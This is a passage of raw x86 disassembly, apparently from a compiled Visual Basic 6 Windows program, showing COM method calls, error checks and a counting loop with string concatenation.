  4047c6:	89 65 e8             	mov    %esp,-0x18(%ebp)
  4047c9:	c7 45 ec 60 12 40 00 	movl   $0x401260,-0x14(%ebp)
  4047d0:	c7 45 f0 00 00 00 00 	movl   $0x0,-0x10(%ebp)
  4047d7:	c7 45 f4 00 00 00 00 	movl   $0x0,-0xc(%ebp)
  4047de:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  4047e5:	8b 55 0c             	mov    0xc(%ebp),%edx
  4047e8:	8d 4d dc             	lea    -0x24(%ebp),%ecx
  4047eb:	ff 15 ec 10 40 00    	call   *0x4010ec
  4047f1:	c7 45 fc 02 00 00 00 	movl   $0x2,-0x4(%ebp)
  4047f8:	6a ff                	push   $0xffffffff
  4047fa:	ff 15 4c 10 40 00    	call   *0x40104c
  404800:	c7 45 fc 03 00 00 00 	movl   $0x3,-0x4(%ebp)
  404807:	83 7d c8 00          	cmpl   $0x0,-0x38(%ebp)
  40480b:	75 1a                	jne    0x404827
  40480d:	8d 45 c8             	lea    -0x38(%ebp),%eax
  404810:	50                   	push   %eax
  404811:	68 9c 2d 40 00       	push   $0x402d9c
  404816:	ff 15 e0 10 40 00    	call   *0x4010e0
  40481c:	8d 4d c8             	lea    -0x38(%ebp),%ecx
  40481f:	89 8d 08 ff ff ff    	mov    %ecx,-0xf8(%ebp)
  404825:	eb 09                	jmp    0x404830
  404827:	8d 55 c8             	lea    -0x38(%ebp),%edx
  40482a:	89 95 08 ff ff ff    	mov    %edx,-0xf8(%ebp)
  404830:	8b 85 08 ff ff ff    	mov    -0xf8(%ebp),%eax
  404836:	8b 08                	mov    (%eax),%ecx
  404838:	89 8d 54 ff ff ff    	mov    %ecx,-0xac(%ebp)
  40483e:	8d 55 b0             	lea    -0x50(%ebp),%edx
  404841:	52                   	push   %edx
  404842:	8b 45 dc             	mov    -0x24(%ebp),%eax
  404845:	50                   	push   %eax
  404846:	8b 8d 54 ff ff ff    	mov    -0xac(%ebp),%ecx
  40484c:	8b 11                	mov    (%ecx),%edx
  40484e:	8b 85 54 ff ff ff    	mov    -0xac(%ebp),%eax
  404854:	50                   	push   %eax
  404855:	ff 52 54             	call   *0x54(%edx)
  404858:	db e2                	fnclex
  40485a:	89 85 50 ff ff ff    	mov    %eax,-0xb0(%ebp)
  404860:	83 bd 50 ff ff ff 00 	cmpl   $0x0,-0xb0(%ebp)
  404867:	7d 23                	jge    0x40488c
  404869:	6a 54                	push   $0x54
  40486b:	68 ac 2d 40 00       	push   $0x402dac
  404870:	8b 8d 54 ff ff ff    	mov    -0xac(%ebp),%ecx
  404876:	51                   	push   %ecx
  404877:	8b 95 50 ff ff ff    	mov    -0xb0(%ebp),%edx
  40487d:	52                   	push   %edx
  40487e:	ff 15 38 10 40 00    	call   *0x401038
  404884:	89 85 04 ff ff ff    	mov    %eax,-0xfc(%ebp)
  40488a:	eb 0a                	jmp    0x404896
  40488c:	c7 85 04 ff ff ff 00 	movl   $0x0,-0xfc(%ebp)
  404893:	00 00 00 
  404896:	68 bc 2d 40 00       	push   $0x402dbc
  40489b:	8b 45 b0             	mov    -0x50(%ebp),%eax
  40489e:	50                   	push   %eax
  40489f:	ff 15 24 11 40 00    	call   *0x401124
  4048a5:	50                   	push   %eax
  4048a6:	8d 4d cc             	lea    -0x34(%ebp),%ecx
  4048a9:	51                   	push   %ecx
  4048aa:	ff 15 54 10 40 00    	call   *0x401054
  4048b0:	8d 4d b0             	lea    -0x50(%ebp),%ecx
  4048b3:	ff 15 40 11 40 00    	call   *0x401140
  4048b9:	c7 45 fc 04 00 00 00 	movl   $0x4,-0x4(%ebp)
  4048c0:	8d 55 b0             	lea    -0x50(%ebp),%edx
  4048c3:	52                   	push   %edx
  4048c4:	8b 45 cc             	mov    -0x34(%ebp),%eax
  4048c7:	8b 08                	mov    (%eax),%ecx
  4048c9:	8b 55 cc             	mov    -0x34(%ebp),%edx
  4048cc:	52                   	push   %edx
  4048cd:	ff 51 64             	call   *0x64(%ecx)
  4048d0:	db e2                	fnclex
  4048d2:	89 85 54 ff ff ff    	mov    %eax,-0xac(%ebp)
  4048d8:	83 bd 54 ff ff ff 00 	cmpl   $0x0,-0xac(%ebp)
  4048df:	7d 20                	jge    0x404901
  4048e1:	6a 64                	push   $0x64
  4048e3:	68 bc 2d 40 00       	push   $0x402dbc
  4048e8:	8b 45 cc             	mov    -0x34(%ebp),%eax
  4048eb:	50                   	push   %eax
  4048ec:	8b 8d 54 ff ff ff    	mov    -0xac(%ebp),%ecx
  4048f2:	51                   	push   %ecx
  4048f3:	ff 15 38 10 40 00    	call   *0x401038
  4048f9:	89 85 00 ff ff ff    	mov    %eax,-0x100(%ebp)
  4048ff:	eb 0a                	jmp    0x40490b
  404901:	c7 85 00 ff ff ff 00 	movl   $0x0,-0x100(%ebp)
  404908:	00 00 00 
  40490b:	8b 55 b0             	mov    -0x50(%ebp),%edx
  40490e:	89 95 0c ff ff ff    	mov    %edx,-0xf4(%ebp)
  404914:	c7 45 b0 00 00 00 00 	movl   $0x0,-0x50(%ebp)
  40491b:	8b 85 0c ff ff ff    	mov    -0xf4(%ebp),%eax
  404921:	50                   	push   %eax
  404922:	8d 8d 34 ff ff ff    	lea    -0xcc(%ebp),%ecx
  404928:	51                   	push   %ecx
  404929:	ff 15 54 10 40 00    	call   *0x401054
  40492f:	50                   	push   %eax
  404930:	8d 55 d4             	lea    -0x2c(%ebp),%edx
  404933:	52                   	push   %edx
  404934:	8d 85 30 ff ff ff    	lea    -0xd0(%ebp),%eax
  40493a:	50                   	push   %eax
  40493b:	68 bc 2d 40 00       	push   $0x402dbc
  404940:	ff 15 48 10 40 00    	call   *0x401048
  404946:	89 85 10 ff ff ff    	mov    %eax,-0xf0(%ebp)
  40494c:	e9 39 07 00 00       	jmp    0x40508a
  404951:	c7 45 fc 05 00 00 00 	movl   $0x5,-0x4(%ebp)
  404958:	ff 15 64 10 40 00    	call   *0x401064
  40495e:	c7 45 fc 06 00 00 00 	movl   $0x6,-0x4(%ebp)
  404965:	8d 4d c4             	lea    -0x3c(%ebp),%ecx
  404968:	51                   	push   %ecx
  404969:	8b 55 d4             	mov    -0x2c(%ebp),%edx
  40496c:	8b 02                	mov    (%edx),%eax
  40496e:	8b 4d d4             	mov    -0x2c(%ebp),%ecx
  404971:	51                   	push   %ecx
  404972:	ff 50 1c             	call   *0x1c(%eax)
  404975:	db e2                	fnclex
  404977:	89 85 54 ff ff ff    	mov    %eax,-0xac(%ebp)
  40497d:	83 bd 54 ff ff ff 00 	cmpl   $0x0,-0xac(%ebp)
  404984:	7d 20                	jge    0x4049a6
  404986:	6a 1c                	push   $0x1c
  404988:	68 bc 2d 40 00       	push   $0x402dbc
  40498d:	8b 55 d4             	mov    -0x2c(%ebp),%edx
  404990:	52                   	push   %edx
  404991:	8b 85 54 ff ff ff    	mov    -0xac(%ebp),%eax
  404997:	50                   	push   %eax
  404998:	ff 15 38 10 40 00    	call   *0x401038
  40499e:	89 85 fc fe ff ff    	mov    %eax,-0x104(%ebp)
  4049a4:	eb 0a                	jmp    0x4049b0
  4049a6:	c7 85 fc fe ff ff 00 	movl   $0x0,-0x104(%ebp)
  4049ad:	00 00 00 
  4049b0:	8b 4d c4             	mov    -0x3c(%ebp),%ecx
  4049b3:	51                   	push   %ecx
  4049b4:	8b 55 08             	mov    0x8(%ebp),%edx
  4049b7:	8b 02                	mov    (%edx),%eax
  4049b9:	8b 4d 08             	mov    0x8(%ebp),%ecx
  4049bc:	51                   	push   %ecx
  4049bd:	ff 90 10 07 00 00    	call   *0x710(%eax)
  4049c3:	8d 4d c4             	lea    -0x3c(%ebp),%ecx
  4049c6:	ff 15 3c 11 40 00    	call   *0x40113c
  4049cc:	c7 45 fc 07 00 00 00 	movl   $0x7,-0x4(%ebp)
  4049d3:	8b 55 08             	mov    0x8(%ebp),%edx
  4049d6:	8b 02                	mov    (%edx),%eax
  4049d8:	8b 4d 08             	mov    0x8(%ebp),%ecx
  4049db:	51                   	push   %ecx
  4049dc:	ff 90 fc 02 00 00    	call   *0x2fc(%eax)
  4049e2:	50                   	push   %eax
  4049e3:	8d 55 b0             	lea    -0x50(%ebp),%edx
  4049e6:	52                   	push   %edx
  4049e7:	ff 15 54 10 40 00    	call   *0x401054
  4049ed:	89 85 50 ff ff ff    	mov    %eax,-0xb0(%ebp)
  4049f3:	8d 45 c4             	lea    -0x3c(%ebp),%eax
  4049f6:	50                   	push   %eax
  4049f7:	8b 4d d4             	mov    -0x2c(%ebp),%ecx
  4049fa:	8b 11                	mov    (%ecx),%edx
  4049fc:	8b 45 d4             	mov    -0x2c(%ebp),%eax
  4049ff:	50                   	push   %eax
  404a00:	ff 52 1c             	call   *0x1c(%edx)
  404a03:	db e2                	fnclex
  404a05:	89 85 54 ff ff ff    	mov    %eax,-0xac(%ebp)
  404a0b:	83 bd 54 ff ff ff 00 	cmpl   $0x0,-0xac(%ebp)
  404a12:	7d 20                	jge    0x404a34
  404a14:	6a 1c                	push   $0x1c
  404a16:	68 bc 2d 40 00       	push   $0x402dbc
  404a1b:	8b 4d d4             	mov    -0x2c(%ebp),%ecx
  404a1e:	51                   	push   %ecx
  404a1f:	8b 95 54 ff ff ff    	mov    -0xac(%ebp),%edx
  404a25:	52                   	push   %edx
  404a26:	ff 15 38 10 40 00    	call   *0x401038
  404a2c:	89 85 f8 fe ff ff    	mov    %eax,-0x108(%ebp)
  404a32:	eb 0a                	jmp    0x404a3e
  404a34:	c7 85 f8 fe ff ff 00 	movl   $0x0,-0x108(%ebp)
  404a3b:	00 00 00 
  404a3e:	8b 45 c4             	mov    -0x3c(%ebp),%eax
  404a41:	50                   	push   %eax
  404a42:	8b 8d 50 ff ff ff    	mov    -0xb0(%ebp),%ecx
  404a48:	8b 11                	mov    (%ecx),%edx
  404a4a:	8b 85 50 ff ff ff    	mov    -0xb0(%ebp),%eax
  404a50:	50                   	push   %eax
  404a51:	ff 92 ac 00 00 00    	call   *0xac(%edx)
  404a57:	db e2                	fnclex
  404a59:	89 85 4c ff ff ff    	mov    %eax,-0xb4(%ebp)
  404a5f:	83 bd 4c ff ff ff 00 	cmpl   $0x0,-0xb4(%ebp)
  404a66:	7d 26                	jge    0x404a8e
  404a68:	68 ac 00 00 00       	push   $0xac
  404a6d:	68 c8 2e 40 00       	push   $0x402ec8
  404a72:	8b 8d 50 ff ff ff    	mov    -0xb0(%ebp),%ecx
  404a78:	51                   	push   %ecx
  404a79:	8b 95 4c ff ff ff    	mov    -0xb4(%ebp),%edx
  404a7f:	52                   	push   %edx
  404a80:	ff 15 38 10 40 00    	call   *0x401038
  404a86:	89 85 f4 fe ff ff    	mov    %eax,-0x10c(%ebp)
  404a8c:	eb 0a                	jmp    0x404a98
  404a8e:	c7 85 f4 fe ff ff 00 	movl   $0x0,-0x10c(%ebp)
  404a95:	00 00 00 
  404a98:	8d 4d c4             	lea    -0x3c(%ebp),%ecx
  404a9b:	ff 15 3c 11 40 00    	call   *0x40113c
  404aa1:	8d 4d b0             	lea    -0x50(%ebp),%ecx
  404aa4:	ff 15 40 11 40 00    	call   *0x401140
  404aaa:	c7 45 fc 08 00 00 00 	movl   $0x8,-0x4(%ebp)
  404ab1:	8b 45 08             	mov    0x8(%ebp),%eax
  404ab4:	8b 08                	mov    (%eax),%ecx
  404ab6:	8b 55 08             	mov    0x8(%ebp),%edx
  404ab9:	52                   	push   %edx
  404aba:	ff 91 fc 02 00 00    	call   *0x2fc(%ecx)
  404ac0:	50                   	push   %eax
  404ac1:	8d 45 b0             	lea    -0x50(%ebp),%eax
  404ac4:	50                   	push   %eax
  404ac5:	ff 15 54 10 40 00    	call   *0x401054
  404acb:	89 85 54 ff ff ff    	mov    %eax,-0xac(%ebp)
  404ad1:	8d 8d 58 ff ff ff    	lea    -0xa8(%ebp),%ecx
  404ad7:	51                   	push   %ecx
  404ad8:	8b 95 54 ff ff ff    	mov    -0xac(%ebp),%edx
  404ade:	8b 02                	mov    (%edx),%eax
  404ae0:	8b 8d 54 ff ff ff    	mov    -0xac(%ebp),%ecx
  404ae6:	51                   	push   %ecx
  404ae7:	ff 90 e8 00 00 00    	call   *0xe8(%eax)
  404aed:	db e2                	fnclex
  404aef:	89 85 50 ff ff ff    	mov    %eax,-0xb0(%ebp)
  404af5:	83 bd 50 ff ff ff 00 	cmpl   $0x0,-0xb0(%ebp)
  404afc:	7d 26                	jge    0x404b24
  404afe:	68 e8 00 00 00       	push   $0xe8
  404b03:	68 c8 2e 40 00       	push   $0x402ec8
  404b08:	8b 95 54 ff ff ff    	mov    -0xac(%ebp),%edx
  404b0e:	52                   	push   %edx
  404b0f:	8b 85 50 ff ff ff    	mov    -0xb0(%ebp),%eax
  404b15:	50                   	push   %eax
  404b16:	ff 15 38 10 40 00    	call   *0x401038
  404b1c:	89 85 f0 fe ff ff    	mov    %eax,-0x110(%ebp)
  404b22:	eb 0a                	jmp    0x404b2e
  404b24:	c7 85 f0 fe ff ff 00 	movl   $0x0,-0x110(%ebp)
  404b2b:	00 00 00 
  404b2e:	66 8b 8d 58 ff ff ff 	mov    -0xa8(%ebp),%cx
  404b35:	66 89 8d 28 ff ff ff 	mov    %cx,-0xd8(%ebp)
  404b3c:	66 c7 85 2c ff ff ff 	movw   $0x1,-0xd4(%ebp)
  404b43:	01 00 
  404b45:	66 c7 45 d0 00 00    	movw   $0x0,-0x30(%ebp)
  404b4b:	8d 4d b0             	lea    -0x50(%ebp),%ecx
  404b4e:	ff 15 40 11 40 00    	call   *0x401140
  404b54:	eb 15                	jmp    0x404b6b
  404b56:	66 8b 55 d0          	mov    -0x30(%ebp),%dx
  404b5a:	66 03 95 2c ff ff ff 	add    -0xd4(%ebp),%dx
  404b61:	0f 80 15 06 00 00    	jo     0x40517c
  404b67:	66 89 55 d0          	mov    %dx,-0x30(%ebp)
  404b6b:	66 8b 45 d0          	mov    -0x30(%ebp),%ax
  404b6f:	66 3b 85 28 ff ff ff 	cmp    -0xd8(%ebp),%ax
  404b76:	0f 8f eb 04 00 00    	jg     0x405067
  404b7c:	c7 45 fc 09 00 00 00 	movl   $0x9,-0x4(%ebp)
  404b83:	83 3d d4 62 40 00 00 	cmpl   $0x0,0x4062d4
  404b8a:	75 1c                	jne    0x404ba8
  404b8c:	68 d4 62 40 00       	push   $0x4062d4
  404b91:	68 dc 2c 40 00       	push   $0x402cdc
  404b96:	ff 15 e0 10 40 00    	call   *0x4010e0
  404b9c:	c7 85 ec fe ff ff d4 	movl   $0x4062d4,-0x114(%ebp)
  404ba3:	62 40 00 
  404ba6:	eb 0a                	jmp    0x404bb2
  404ba8:	c7 85 ec fe ff ff d4 	movl   $0x4062d4,-0x114(%ebp)
  404baf:	62 40 00 
  404bb2:	8b 8d ec fe ff ff    	mov    -0x114(%ebp),%ecx
  404bb8:	8b 11                	mov    (%ecx),%edx
  404bba:	89 95 54 ff ff ff    	mov    %edx,-0xac(%ebp)
  404bc0:	8d 45 b0             	lea    -0x50(%ebp),%eax
  404bc3:	50                   	push   %eax
  404bc4:	8b 8d 54 ff ff ff    	mov    -0xac(%ebp),%ecx
  404bca:	8b 11                	mov    (%ecx),%edx
  404bcc:	8b 85 54 ff ff ff    	mov    -0xac(%ebp),%eax
  404bd2:	50                   	push   %eax
  404bd3:	ff 52 14             	call   *0x14(%edx)
  404bd6:	db e2                	fnclex
  404bd8:	89 85 50 ff ff ff    	mov    %eax,-0xb0(%ebp)
  404bde:	83 bd 50 ff ff ff 00 	cmpl   $0x0,-0xb0(%ebp)
  404be5:	7d 23                	jge    0x404c0a
  404be7:	6a 14                	push   $0x14
  404be9:	68 cc 2c 40 00       	push   $0x402ccc
  404bee:	8b 8d 54 ff ff ff    	mov    -0xac(%ebp),%ecx
  404bf4:	51                   	push   %ecx
  404bf5:	8b 95 50 ff ff ff    	mov    -0xb0(%ebp),%edx
  404bfb:	52                   	push   %edx
  404bfc:	ff 15 38 10 40 00    	call   *0x401038
  404c02:	89 85 e8 fe ff ff    	mov    %eax,-0x118(%ebp)
  404c08:	eb 0a                	jmp    0x404c14
  404c0a:	c7 85 e8 fe ff ff 00 	movl   $0x0,-0x118(%ebp)
  404c11:	00 00 00 
  404c14:	8b 45 b0             	mov    -0x50(%ebp),%eax
  404c17:	89 85 4c ff ff ff    	mov    %eax,-0xb4(%ebp)
  404c1d:	8d 4d c4             	lea    -0x3c(%ebp),%ecx
  404c20:	51                   	push   %ecx
  404c21:	8b 95 4c ff ff ff    	mov    -0xb4(%ebp),%edx
  404c27:	8b 02                	mov    (%edx),%eax
  404c29:	8b 8d 4c ff ff ff    	mov    -0xb4(%ebp),%ecx
  404c2f:	51                   	push   %ecx
  404c30:	ff 50 50             	call   *0x50(%eax)
  404c33:	db e2                	fnclex
  404c35:	89 85 48 ff ff ff    	mov    %eax,-0xb8(%ebp)
  404c3b:	83 bd 48 ff ff ff 00 	cmpl   $0x0,-0xb8(%ebp)
  404c42:	7d 23                	jge    0x404c67
  404c44:	6a 50                	push   $0x50
  404c46:	68 ec 2c 40 00       	push   $0x402cec
  404c4b:	8b 95 4c ff ff ff    	mov    -0xb4(%ebp),%edx
  404c51:	52                   	push   %edx
  404c52:	8b 85 48 ff ff ff    	mov    -0xb8(%ebp),%eax
  404c58:	50                   	push   %eax
  404c59:	ff 15 38 10 40 00    	call   *0x401038
  404c5f:	89 85 e4 fe ff ff    	mov    %eax,-0x11c(%ebp)
  404c65:	eb 0a                	jmp    0x404c71
  404c67:	c7 85 e4 fe ff ff 00 	movl   $0x0,-0x11c(%ebp)
  404c6e:	00 00 00 
  404c71:	83 3d d4 62 40 00 00 	cmpl   $0x0,0x4062d4
  404c78:	75 1c                	jne    0x404c96
  404c7a:	68 d4 62 40 00       	push   $0x4062d4
  404c7f:	68 dc 2c 40 00       	push   $0x402cdc
  404c84:	ff 15 e0 10 40 00    	call   *0x4010e0
  404c8a:	c7 85 e0 fe ff ff d4 	movl   $0x4062d4,-0x120(%ebp)
  404c91:	62 40 00 
  404c94:	eb 0a                	jmp    0x404ca0
  404c96:	c7 85 e0 fe ff ff d4 	movl   $0x4062d4,-0x120(%ebp)
  404c9d:	62 40 00 
  404ca0:	8b 8d e0 fe ff ff    	mov    -0x120(%ebp),%ecx
  404ca6:	8b 11                	mov    (%ecx),%edx
  404ca8:	89 95 44 ff ff ff    	mov    %edx,-0xbc(%ebp)
  404cae:	8d 45 ac             	lea    -0x54(%ebp),%eax
  404cb1:	50                   	push   %eax
  404cb2:	8b 8d 44 ff ff ff    	mov    -0xbc(%ebp),%ecx
  404cb8:	8b 11                	mov    (%ecx),%edx
  404cba:	8b 85 44 ff ff ff    	mov    -0xbc(%ebp),%eax
  404cc0:	50                   	push   %eax
  404cc1:	ff 52 14             	call   *0x14(%edx)
  404cc4:	db e2                	fnclex
  404cc6:	89 85 40 ff ff ff    	mov    %eax,-0xc0(%ebp)
  404ccc:	83 bd 40 ff ff ff 00 	cmpl   $0x0,-0xc0(%ebp)
  404cd3:	7d 23                	jge    0x404cf8
  404cd5:	6a 14                	push   $0x14
  404cd7:	68 cc 2c 40 00       	push   $0x402ccc
  404cdc:	8b 8d 44 ff ff ff    	mov    -0xbc(%ebp),%ecx
  404ce2:	51                   	push   %ecx
  404ce3:	8b 95 40 ff ff ff    	mov    -0xc0(%ebp),%edx
  404ce9:	52                   	push   %edx
  404cea:	ff 15 38 10 40 00    	call   *0x401038
  404cf0:	89 85 dc fe ff ff    	mov    %eax,-0x124(%ebp)
  404cf6:	eb 0a                	jmp    0x404d02
  404cf8:	c7 85 dc fe ff ff 00 	movl   $0x0,-0x124(%ebp)
  404cff:	00 00 00 
  404d02:	8b 45 ac             	mov    -0x54(%ebp),%eax
  404d05:	89 85 3c ff ff ff    	mov    %eax,-0xc4(%ebp)
  404d0b:	8d 4d c0             	lea    -0x40(%ebp),%ecx
  404d0e:	51                   	push   %ecx
  404d0f:	8b 95 3c ff ff ff    	mov    -0xc4(%ebp),%edx
  404d15:	8b 02                	mov    (%edx),%eax
  404d17:	8b 8d 3c ff ff ff    	mov    -0xc4(%ebp),%ecx
  404d1d:	51                   	push   %ecx
  404d1e:	ff 50 58             	call   *0x58(%eax)
  404d21:	db e2                	fnclex
  404d23:	89 85 38 ff ff ff    	mov    %eax,-0xc8(%ebp)
  404d29:	83 bd 38 ff ff ff 00 	cmpl   $0x0,-0xc8(%ebp)
  404d30:	7d 23                	jge    0x404d55
  404d32:	6a 58                	push   $0x58
  404d34:	68 ec 2c 40 00       	push   $0x402cec
  404d39:	8b 95 3c ff ff ff    	mov    -0xc4(%ebp),%edx
  404d3f:	52                   	push   %edx
  404d40:	8b 85 38 ff ff ff    	mov    -0xc8(%ebp),%eax
  404d46:	50                   	push   %eax
  404d47:	ff 15 38 10 40 00    	call   *0x401038
  404d4d:	89 85 d8 fe ff ff    	mov    %eax,-0x128(%ebp)
  404d53:	eb 0a                	jmp    0x404d5f
  404d55:	c7 85 d8 fe ff ff 00 	movl   $0x0,-0x128(%ebp)
  404d5c:	00 00 00 
  404d5f:	8b 4d c4             	mov    -0x3c(%ebp),%ecx
  404d62:	51                   	push   %ecx
  404d63:	68 00 2d 40 00       	push   $0x402d00
  404d68:	ff 15 34 10 40 00    	call   *0x401034
  404d6e:	8b d0                	mov    %eax,%edx
  404d70:	8d 4d bc             	lea    -0x44(%ebp),%ecx
  404d73:	ff 15 20 11 40 00    	call   *0x401120
  404d79:	50                   	push   %eax
  404d7a:	8b 55 c0             	mov    -0x40(%ebp),%edx
  404d7d:	52                   	push   %edx
  404d7e:	ff 15 34 10 40 00    	call   *0x401034
  404d84:	8b d0                	mov    %eax,%edx
  404d86:	8d 4d b8             	lea    -0x48(%ebp),%ecx
  404d89:	ff 15 20 11 40 00    	call   *0x401120
  404d8f:	50                   	push   %eax
  404d90:	68 08 2d 40 00       	push   $0x402d08
  404d95:	ff 15 34 10 40 00    	call   *0x401034
  404d9b:	8b d0                	mov    %eax,%edx
  404d9d:	8d 4d b4             	lea    -0x4c(%ebp),%ecx
  404da0:	ff 15 20 11 40 00    	call   *0x401120
  404da6:	8b d0                	mov    %eax,%edx
  404da8:	8b 4d 08             	mov    0x8(%ebp),%ecx
  404dab:	83 c1 3c             	add    $0x3c,%ecx
  404dae:	ff 15 ec 10 40 00    	call   *0x4010ec
  404db4:	8d 45 b4             	lea    -0x4c(%ebp),%eax
  404db7:	50                   	push   %eax
  404db8:	8d 4d b8             	lea    -0x48(%ebp),%ecx
  404dbb:	51                   	push   %ecx
  404dbc:	8d 55 c0             	lea    -0x40(%ebp),%edx
  404dbf:	52                   	push   %edx
  404dc0:	8d 45 bc             	lea    -0x44(%ebp),%eax
  404dc3:	50                   	push   %eax
  404dc4:	8d 4d c4             	lea    -0x3c(%ebp),%ecx
  404dc7:	51                   	push   %ecx
  404dc8:	6a 05                	push   $0x5
  404dca:	ff 15 f0 10 40 00    	call   *0x4010f0
  404dd0:	83 c4 18             	add    $0x18,%esp
  404dd3:	8d 55 ac             	lea    -0x54(%ebp),%edx
  404dd6:	52                   	push   %edx
  404dd7:	8d 45 b0             	lea    -0x50(%ebp),%eax
  404dda:	50                   	push   %eax
  404ddb:	6a 02                	push   $0x2
  404ddd:	ff 15 28 10 40 00    	call   *0x401028
  404de3:	83 c4 0c             	add    $0xc,%esp
  404de6:	c7 45 fc 0a 00 00 00 	movl   $0xa,-0x4(%ebp)
  404ded:	8b 4d 08             	mov    0x8(%ebp),%ecx
  404df0:	8b 11                	mov    (%ecx),%edx
  404df2:	8b 45 08             	mov    0x8(%ebp),%eax
  404df5:	50                   	push   %eax
  404df6:	ff 92 fc 02 00 00    	call   *0x2fc(%edx)
  404dfc:	50                   	push   %eax
  404dfd:	8d 4d b0             	lea    -0x50(%ebp),%ecx
  404e00:	51                   	push   %ecx
  404e01:	ff 15 54 10 40 00    	call   *0x401054
  404e07:	89 85 54 ff ff ff    	mov    %eax,-0xac(%ebp)
  404e0d:	8d 55 c4             	lea    -0x3c(%ebp),%edx
  404e10:	52                   	push   %edx
  404e11:	8b 85 54 ff ff ff    	mov    -0xac(%ebp),%eax
  404e17:	8b 08                	mov    (%eax),%ecx
  404e19:	8b 95 54 ff ff ff    	mov    -0xac(%ebp),%edx
  404e1f:	52                   	push   %edx
  404e20:	ff 91 a8 00 00 00    	call   *0xa8(%ecx)
  404e26:	db e2                	fnclex
  404e28:	89 85 50 ff ff ff    	mov    %eax,-0xb0(%ebp)
  404e2e:	83 bd 50 ff ff ff 00 	cmpl   $0x0,-0xb0(%ebp)
  404e35:	7d 26                	jge    0x404e5d
  404e37:	68 a8 00 00 00       	push   $0xa8
  404e3c:	68 c8 2e 40 00       	push   $0x402ec8
  404e41:	8b 85 54 ff ff ff    	mov    -0xac(%ebp),%eax
  404e47:	50                   	push   %eax
  404e48:	8b 8d 50 ff ff ff    	mov    -0xb0(%ebp),%ecx
  404e4e:	51                   	push   %ecx
  404e4f:	ff 15 38 10 40 00    	call   *0x401038
  404e55:	89 85 d4 fe ff ff    	mov    %eax,-0x12c(%ebp)
  404e5b:	eb 0a                	jmp    0x404e67
  404e5d:	c7 85 d4 fe ff ff 00 	movl   $0x0,-0x12c(%ebp)
  404e64:	00 00 00 
  404e67:	8b 55 08             	mov    0x8(%ebp),%edx
  404e6a:	8b 02                	mov    (%edx),%eax
  404e6c:	8b 4d 08             	mov    0x8(%ebp),%ecx
  404e6f:	51                   	push   %ecx
  404e70:	ff 90 fc 02 00 00    	call   *0x2fc(%eax)
  404e76:	50                   	push   %eax
  404e77:	8d 55 ac             	lea    -0x54(%ebp),%edx
  404e7a:	52                   	push   %edx
  404e7b:	ff 15 54 10 40 00    	call   *0x401054
  404e81:	89 85 4c ff ff ff    	mov    %eax,-0xb4(%ebp)
  404e87:	8d 45 c0             	lea    -0x40(%ebp),%eax
  404e8a:	50                   	push   %eax
  404e8b:	66 8b 4d d0          	mov    -0x30(%ebp),%cx
  404e8f:	51                   	push   %ecx
  404e90:	8b 95 4c ff ff ff    	mov    -0xb4(%ebp),%edx
  404e96:	8b 02                	mov    (%edx),%eax
  404e98:	8b 8d 4c ff ff ff    	mov    -0xb4(%ebp),%ecx
  404e9e:	51                   	push   %ecx
  404e9f:	ff 90 f8 00 00 00    	call   *0xf8(%eax)
  404ea5:	db e2                	fnclex
  404ea7:	89 85 48 ff ff ff    	mov    %eax,-0xb8(%ebp)
  404ead:	83 bd 48 ff ff ff 00 	cmpl   $0x0,-0xb8(%ebp)
  404eb4:	7d 26                	jge    0x404edc
  404eb6:	68 f8 00 00 00       	push   $0xf8
  404ebb:	68 c8 2e 40 00       	push   $0x402ec8
  404ec0:	8b 95 4c ff ff ff    	mov    -0xb4(%ebp),%edx
  404ec6:	52                   	push   %edx
  404ec7:	8b 85 48 ff ff ff    	mov    -0xb8(%ebp),%eax
  404ecd:	50                   	push   %eax
  404ece:	ff 15 38 10 40 00    	call   *0x401038
  404ed4:	89 85 d0 fe ff ff    	mov    %eax,-0x130(%ebp)
  404eda:	eb 0a                	jmp    0x404ee6
  404edc:	c7 85 d0 fe ff ff 00 	movl   $0x0,-0x130(%ebp)
  404ee3:	00 00 00 
  404ee6:	8b 4d c4             	mov    -0x3c(%ebp),%ecx
  404ee9:	51                   	push   %ecx
  404eea:	68 00 2d 40 00       	push   $0x402d00
  404eef:	ff 15 34 10 40 00    	call   *0x401034
  404ef5:	8b d0                	mov    %eax,%edx
  404ef7:	8d 4d bc             	lea    -0x44(%ebp),%ecx
  404efa:	ff 15 20 11 40 00    	call   *0x401120
  404f00:	50                   	push   %eax
  404f01:	8b 55 c0             	mov    -0x40(%ebp),%edx
  404f04:	52                   	push   %edx
  404f05:	ff 15 34 10 40 00    	call   *0x401034
  404f0b:	8b d0                	mov    %eax,%edx
  404f0d:	8d 4d b8             	lea    -0x48(%ebp),%ecx
  404f10:	ff 15 20 11 40 00    	call   *0x401120
  404f16:	8b d0                	mov    %eax,%edx
  404f18:	8b 4d 08             	mov    0x8(%ebp),%ecx
  404f1b:	83 c1 40             	add    $0x40,%ecx
  404f1e:	ff 15 ec 10 40 00    	call   *0x4010ec
  404f24:	8d 45 b8             	lea    -0x48(%ebp),%eax
  404f27:	50                   	push   %eax
  404f28:	8d 4d c0             	lea    -0x40(%ebp),%ecx
  404f2b:	51                   	push   %ecx
  404f2c:	8d 55 bc             	lea    -0x44(%ebp),%edx
  404f2f:	52                   	push   %edx
  404f30:	8d 45 c4             	lea    -0x3c(%ebp),%eax
  404f33:	50                   	push   %eax
  404f34:	6a 04                	push   $0x4
  404f36:	ff 15 f0 10 40 00    	call   *0x4010f0
  404f3c:	83 c4 14             	add    $0x14,%esp
  404f3f:	8d 4d ac             	lea    -0x54(%ebp),%ecx
  404f42:	51                   	push   %ecx
  404f43:	8d 55 b0             	lea    -0x50(%ebp),%edx
  404f46:	52                   	push   %edx
  404f47:	6a 02                	push   $0x2
  404f49:	ff 15 28 10 40 00    	call   *0x401028
  404f4f:	83 c4 0c             	add    $0xc,%esp
  404f52:	c7 45 fc 0b 00 00 00 	movl   $0xb,-0x4(%ebp)
  404f59:	8b 45 08             	mov    0x8(%ebp),%eax
  404f5c:	8b 48 40             	mov    0x40(%eax),%ecx
  404f5f:	51                   	push   %ecx
  404f60:	68 dc 2e 40 00       	push   $0x402edc
  404f65:	ff 15 34 10 40 00    	call   *0x401034
  404f6b:	8b d0                	mov    %eax,%edx
  404f6d:	8d 4d c4             	lea    -0x3c(%ebp),%ecx
  404f70:	ff 15 20 11 40 00    	call   *0x401120
  404f76:	8b d0                	mov    %eax,%edx
  404f78:	8b 4d 08             	mov    0x8(%ebp),%ecx
  404f7b:	83 c1 44             	add    $0x44,%ecx
